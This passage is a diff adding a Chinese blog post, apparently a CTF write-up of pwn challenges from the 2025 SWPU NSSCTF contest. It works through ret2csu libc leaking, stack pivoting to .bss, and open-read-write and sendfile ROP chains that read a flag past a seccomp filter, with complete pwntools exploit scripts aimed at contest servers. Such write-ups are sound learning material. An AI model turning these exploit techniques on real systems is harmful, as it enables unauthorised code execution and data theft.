+<p>设置完之后再到第二段即可跳转回去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(csu2_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)+p64(main_addr)<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776645955785-841432c9-d9d9-470b-819e-57649a5a64ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>来写exp吧，这题给了libc，不用search了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">21340</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2csu&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br>csu1_addr = <span class="hljs-number">0x4012aa</span>   <br>csu2_addr = <span class="hljs-number">0x401290</span>   <br>offset = <span class="hljs-number">0x100</span> + <span class="hljs-number">8</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * offset<br>payload += p64(csu1_addr)   <span class="hljs-comment">#我跳过了那个add，所以这边不用p64（0），不然是需要的</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>payload += p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(write_got)<br>payload += p64(csu2_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)+p64(main_addr)<br><br>io.recvuntil(<span class="hljs-string">b&quot;Input:\n&quot;</span>)<br>io.send(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;Ok.\n&quot;</span>)<br>write_addr = u64(io.recvn(<span class="hljs-number">8</span>))<br><br>log.success(<span class="hljs-string">&quot;write_addr = &quot;</span> + <span class="hljs-built_in">hex</span>(write_addr))<br><br>libc_base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * offset<br>payload2 += p64(pop_rdi)<br>payload2 += p64(bin_sh)<br>payload2 += p64(ret)           <span class="hljs-comment"># 栈对齐</span><br>payload2 += p64(system_addr)<br><br>io.recvuntil(<span class="hljs-string">b&quot;Input:\n&quot;</span>)<br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776647828351-d428f94e-9b1a-4d29-9206-fd71ffdcb880.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403463658-e5d47aff-a273-46c5-85fd-6a3e269b4371.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776647923196-fb450290-3a80-4597-a233-0a3436ca2f37.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开IDA分析</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648010750-ef744841-9367-417b-9819-0c0bfc9f0dcc.png" srcset="/img/loading.gif" lazyload><!-- 这是一张图片，ocr 内容为： --><br><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648019851-ea25acc2-1751-406c-909e-35513caafa7f.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开看到一个明显的栈溢出，但溢出空间不是很大，很小一个</p>
+<p>需要我们栈迁移</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648119345-7a0e8982-a252-4df3-979d-ad6b3faee6fc.png" srcset="/img/loading.gif" lazyload></p>
+<p>main函数里边的初始化部分还存在一个sandbox函数</p>
+<p>禁止execve，是一道ORW题目</p>
+<p>栈溢出+栈迁移+ORW</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776653304130-cf9fcb06-d279-4e11-ad89-4608c7475bf0.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用最后的leave retn，我们可以实现栈迁移</p>
+<p>注意这边实际上是在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">mov rsp, rbp<br>pop rbp<br></code></pre></td></tr></table></figure>
+
+<p>所以我们返回的时候要从这个0x40127F开始，不然上边push rbp又给冲掉了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776653294746-ce2273ad-ec12-4fad-a79f-c71c9651b60e.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样子就能把第二次的输入直接读到我们想要的位置了</p>
+<p>好开始伪造rbp进行栈迁移，直接到.bss段</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776656108995-ab93a332-b8c0-4808-840b-83baa805968e.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以直接选落在 <code>.bss/.data</code> 所在那个 RW LOAD 段的已映射可写页里的一块空地方，比如是0x404800</p>
+<p>所以我们第一次是先移到.bss段，再返回上边的位置再次获得以此输入机会</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">bss = <span class="hljs-number">0x404800</span><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x210</span> + p64(bss) + p64(<span class="hljs-number">0x40127F</span>)<br></code></pre></td></tr></table></figure>
+
+<p>于是当前vuln执行完之后执行leave;ret，然后rbp&#x3D;bss，rip&#x3D;0x40127F</p>
+<p>所以我们第二次read的时候读入位置会变成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[rbp - <span class="hljs-number">0x210</span>] = [<span class="hljs-number">0x404800</span> - <span class="hljs-number">0x210</span>] = <span class="hljs-number">0x4045f0</span><br></code></pre></td></tr></table></figure>
+
+<p>这样子我们第二次输入就能直接读到.bss里边，因为第二次read的起点已经变成了bss-0x210，所以我们覆盖saved rbp&#x3D;bss-0x210，saved rip&#x3D;leave_ret</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(next_rbp) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>payload2 = Payload.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss - <span class="hljs-number">0x210</span>) + p64(leave_ret)<br></code></pre></td></tr></table></figure>
+
+<p>所以两次leave，ret之后rsp就会正式落到我们的fake stack上边去了，有了足够大的栈空间</p>
+<p>之后就是要泄露libc_base地址了，我们直接利用puts函数传参，在第二次payload直接输出puts的真实地址即可</p>
+<p>有了libc_base我们就可以直接拿来ORW了，大概就这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-number">0</span>)<br>read(<span class="hljs-number">3</span>, flag_buf, <span class="hljs-number">0x50</span>)<br>write(<span class="hljs-number">1</span>, flag_buf, <span class="hljs-number">0x50</span>)<br></code></pre></td></tr></table></figure>
+
+<p>传三参，我们需要rdi，rsi，rdx</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776753619078-c813a393-883d-435f-bfc0-c6cab294359f.png" srcset="/img/loading.gif" lazyload></p>
+<p>有rdi，有rsi，但是没有rdx，所以我们还是需要去libc里边搞一个pop rdx;ret才行</p>
+<p>还有就是这里记得要写”.&#x2F;flag\x00\x00”，保持八字节对齐</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">21685</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># ---------------- 基本地址 ----------------</span><br>vuln        = <span class="hljs-number">0x40127f</span>          <span class="hljs-comment"># 跳过函数序言，重新进入 read</span><br>leave_ret   = <span class="hljs-number">0x4012bf</span>          <span class="hljs-comment"># 真正做 pivot 的 gadget</span><br>pop_rdi     = <span class="hljs-number">0x401353</span><br>pop_rsi_r15 = <span class="hljs-number">0x401351</span><br>ret         = <span class="hljs-number">0x40101a</span>          <span class="hljs-comment"># 对齐用</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment"># ---------------- fake stack 规划 ----------------</span><br><span class="hljs-comment"># 注意：0x404800 不是“.bss 起点”，而是 RW 段同页里手动挑的一块干净区域</span><br>fake_rbp = <span class="hljs-number">0x404800</span>             <span class="hljs-comment"># 第一次把 rbp 改到这里</span><br>stage2   = fake_rbp - <span class="hljs-number">0x210</span>     <span class="hljs-comment"># 第二次输入实际落点</span><br>next_rbp = <span class="hljs-number">0x404b00</span>             <span class="hljs-comment"># leak 完后，为第三次 read 准备的新 rbp</span><br>stage3   = next_rbp - <span class="hljs-number">0x210</span>     <span class="hljs-comment"># 第三次输入实际落点</span><br>flag_buf = <span class="hljs-number">0x404d80</span>             <span class="hljs-comment"># 读 flag 内容到这里</span><br><br><span class="hljs-comment"># ---------------- stage 1 ----------------</span><br><span class="hljs-comment"># 作用：不是真正执行 ROP，而是把下一次 read 的目标位置改到 .bss / RW 段</span><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x210</span><br>payload1 += p64(fake_rbp)       <span class="hljs-comment"># 覆盖 saved rbp</span><br>payload1 += p64(vuln)           <span class="hljs-comment"># 覆盖 saved rip，回到 vuln+0xf</span><br>io.sendafter(<span class="hljs-string">b&#x27;try it\n&#x27;</span>, payload1)<br><br><span class="hljs-comment"># ---------------- stage 2 ----------------</span><br><span class="hljs-comment"># 作用：在 stage2 上铺 fake stack，真正 pivot 过去，然后 leak puts</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># pivot 后的执行流：</span><br><span class="hljs-comment">#   rbp = next_rbp</span><br><span class="hljs-comment">#   rip = pop_rdi</span><br><span class="hljs-comment">#   pop rdi -&gt; puts_got</span><br><span class="hljs-comment">#   call puts@plt</span><br><span class="hljs-comment">#   return to vuln</span><br><span class="hljs-comment">#</span><br>payload2 = flat(<br>    next_rbp,                   <span class="hljs-comment"># 最后一次 leave 时会被弹进 rbp</span><br>    pop_rdi,<br>    puts_got,<br>    puts_plt,<br>    vuln<br>)<br><br><span class="hljs-comment"># 把 fake stack 区填满到 saved rbp / saved rip 的位置</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2 += p64(stage2)         <span class="hljs-comment"># 覆盖本轮 saved rbp</span><br>payload2 += p64(leave_ret)      <span class="hljs-comment"># 覆盖本轮 saved rip，触发真正 pivot</span><br>io.sendafter(<span class="hljs-string">b&#x27;try it\n&#x27;</span>, payload2)<br><br><span class="hljs-comment"># 第二轮 puts(buf) 因为 payload2 开头是 next_rbp，最低字节通常是 \x00，所以只会打印一个空行</span><br>io.recvline()<br><br><span class="hljs-comment"># 接收 puts(puts_got) 打出来的真实地址</span><br>leak = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">f&#x27;libc base = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 同步到下一次 &quot;try it&quot;</span><br>io.recvuntil(<span class="hljs-string">b&#x27;try it\n&#x27;</span>)<br><br><span class="hljs-comment"># libc 里需要的地址</span><br>pop_rdx  = libc.address + <span class="hljs-number">0x142c92</span>   <span class="hljs-comment"># pop rdx ; ret</span><br>open_    = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_    = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_   = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-comment"># ---------------- stage 3 ----------------</span><br><span class="hljs-comment"># open(&quot;./flag&quot;, 0)</span><br><span class="hljs-comment"># read(3, flag_buf, 0x50)</span><br><span class="hljs-comment"># write(1, flag_buf, 0x50)</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># 最后一次 leave 会把这 8 字节弹进 rbp，但后面不会再用 rbp，所以没关系。</span><br>payload3 = flat(<br>    <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br><br>    <span class="hljs-comment"># open(&quot;./flag&quot;, 0)</span><br>    pop_rdi, stage3,<br>    pop_rsi_r15, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    ret, open_,<br><br>    <span class="hljs-comment"># read(3, flag_buf, 0x50)</span><br>    pop_rdi, <span class="hljs-number">3</span>,<br>    pop_rsi_r15, flag_buf, <span class="hljs-number">0</span>,<br>    pop_rdx, <span class="hljs-number">0x50</span>,<br>    ret, read_,<br><br>    <span class="hljs-comment"># write(1, flag_buf, 0x50)</span><br>    pop_rdi, <span class="hljs-number">1</span>,<br>    pop_rsi_r15, flag_buf, <span class="hljs-number">0</span>,<br>    pop_rdx, <span class="hljs-number">0x50</span>,<br>    ret, write_<br>)<br><br>payload3 = payload3.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += p64(stage3)<br>payload3 += p64(leave_ret)<br>io.send(payload3)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>拿ai完善了一下，清晰多了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776752141737-34d65846-bbce-434d-be9b-a59c47c5b4d9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="不可名状的东西"><a href="#不可名状的东西" class="headerlink" title="不可名状的东西"></a>不可名状的东西</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403472454-4c5914d5-6c79-4af1-8f93-a7c134030513.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776756736042-0b6749a2-7a76-4f1a-9268-07d22418a372.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开IDA看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776756770120-70900ff8-a1d3-4b15-91ba-3e23c3730bb7.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这又是一个很明显的栈溢出以及栈迁移，因为给的栈空间很小，所以一开始是想构造一个栈迁移之后泄露libc_base然后直接system提权的，但是发现报错了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776768370502-a84fd72b-3fdb-49f3-8bab-a2bef4e36e05.png" srcset="/img/loading.gif" lazyload></p>
+<p>看了程序没看到有过滤，但是写了一个脚本回显了 SIGSYS  ，看来execve被过滤了，只能利用ORW来做这道题</p>
+<p>那跟上一题其实差不多，都是先利用栈溢出来进行栈迁移，最后利用ORW读出flag</p>
+<p>唯一不太一样的是这一题的大小不够，ORW想全部执行空间不够，所以我们可以改用sendfile()函数来替代read()和write()函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>io = remote(<span class="hljs-string">&quot;node6.anna.nssctf.cn&quot;</span>, <span class="hljs-number">22633</span>)<br>elf  = ELF(<span class="hljs-string">&quot;./level1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>puts_got  = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt  = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>read_again = <span class="hljs-number">0x4011ef</span><br>leave_ret  = <span class="hljs-number">0x40120f</span><br>pop_rdi    = <span class="hljs-number">0x4011c5</span><br>bss        = <span class="hljs-number">0x404200</span><br>stage2     = bss<br>next_rbp   = bss + <span class="hljs-number">0xa8</span><br>stage3     = bss + <span class="hljs-number">0x28</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;name!&quot;</span>)<br><br>payload1  = <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x80</span><br>payload1 += p64(bss + <span class="hljs-number">0x80</span>)<br>payload1 += p64(read_again)<br>io.send(payload1)<br><br>payload2  = p64(next_rbp)<br>payload2 += p64(pop_rdi)<br>payload2 += p64(puts_got) <br>payload2 += p64(puts_plt)<br>payload2 += p64(read_again)<br>payload2  = payload2.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload2 += p64(stage2)      <br>payload2 += p64(leave_ret)   <br>io.send(payload2)<br><br>io.recvline(timeout=<span class="hljs-number">2</span>)<br>puts_addr = u64(io.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rsi     = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x904a9</span><br>pop_rcx     = libc_base + <span class="hljs-number">0x3d1ee</span><br><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>sendfile  = libc_base + libc.sym[<span class="hljs-string">&quot;sendfile&quot;</span>]<br><br><span class="hljs-comment"># 其实就是在上一题基础上改成了open(&quot;./flag&quot;,0) + sendfile(1,3,0,0x40)</span><br>payload3  = <span class="hljs-string">b&quot;./flag\x00\x00&quot;</span><br><br>payload3 += p64(pop_rdi) + p64(stage3)<br>payload3 += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(open_addr)<br><br>payload3 += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>payload3 += p64(pop_rsi) + p64(<span class="hljs-number">3</span>)<br>payload3 += p64(pop_rdx_rbx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(pop_rcx) + p64(<span class="hljs-number">0x40</span>)<br>payload3 += p64(sendfile)<br><br>payload3 += p64(stage3) + p64(leave_ret)<br>io.send(payload3)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776770002296-63ef8384-8265-4ff0-83d5-4ce0d4bec9f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>也是终于复盘完了，完成了当年没完成的，只是最后的栈迁移和ORW还是不太熟练，还得再练练</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/%E6%96%B0%E7%94%9F%E8%B5%9B/" class="print-no-link">#新生赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025-SWPU-NSSCTF(Pwn全)</div>
+      <div>https://mei-you-qian.github.io/2026/04/21/2025-SWPU-NSSCTF(Pwn全)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Meiyouqian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/10/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="CTFshow-Pwn入门Bypass安全机制(111-120))">
+                        <span class="hidden-mobile">CTFshow-Pwn入门Bypass安全机制(111-120))</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
